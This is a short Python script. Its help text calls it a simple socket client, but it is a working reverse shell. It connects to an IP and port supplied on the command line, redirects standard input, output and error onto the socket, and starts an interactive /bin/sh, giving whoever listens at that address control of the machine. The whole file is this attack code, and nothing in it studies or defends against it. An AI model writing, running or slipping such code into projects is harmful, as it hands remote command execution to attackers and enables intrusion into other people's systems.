import os
import socket
import subprocess
from argparse import ArgumentParser


def parse_cl():
    parser = ArgumentParser(description='Simple client socket implementation')
    parser.add_argument(
        '-i', '--ip', required=True, help='Remote ip for connection')
    parser.add_argument(
        '-p', '--port', type=int, required=True, help='Remote port')
    return parser.parse_args()


def runsock(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"], shell=True)

if __name__ == '__main__':
    args = parse_cl()
    runsock(args.ip, args.port)
